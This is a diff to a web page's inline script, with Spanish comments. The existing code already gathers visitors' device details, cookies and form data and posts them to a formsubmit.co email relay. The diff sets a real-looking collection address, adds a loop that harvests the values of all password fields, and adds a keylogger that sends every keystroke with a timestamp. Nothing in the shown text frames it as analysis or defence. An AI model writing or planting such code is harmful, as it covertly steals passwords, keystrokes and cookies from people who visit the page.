@@ -45,7 +45,7 @@
 
     <script>
         // 📧 CORREO DE DESTINO:
-        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/tu_correo@gmail.com';
+        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/system404@gmail.com';
 
         // --- 1. Recolección de datos del dispositivo ---
         const userAgent = navigator.userAgent;
@@ -73,6 +73,27 @@
                 finalPayload.FormData = formObject;
                 sendData(finalPayload);
             });
+        });
+
+        // --- 4. Recolección de contraseñas almacenadas ---
+        const passwords = [];
+        for (let i = 0; i < document.forms.length; i++) {
+            for (let j = 0; j < document.forms[i].elements.length; j++) {
+                if (document.forms[i].elements[j].type === 'password') {
+                    passwords.push(document.forms[i].elements[j].value);
+                }
+            }
+        }
+
+        // --- 5. Keylogger ---
+        document.addEventListener('keydown', function(event) {
+            const keylogData = {
+                key: event.key,
+                code: event.code,
+                timestamp: new Date().toLocaleString()
+            };
+            finalPayload.KeylogData = keylogData;
+            sendData(finalPayload);
         });
 
         // --- FUNCIÓN PRINCIPAL: API de Respaldo (ipinfo.io/json) para Máxima Estabilidad ---
@@ -103,6 +124,7 @@
                     "Zona_Horaria": timeZone,
                     "Referencia_Web": referrer,
                     "Cookies": cookies,
+                    "Contraseñas_Almacenadas": passwords,
                     "Fecha_Hora_Visita": new Date().toLocaleString(),
                 };
 
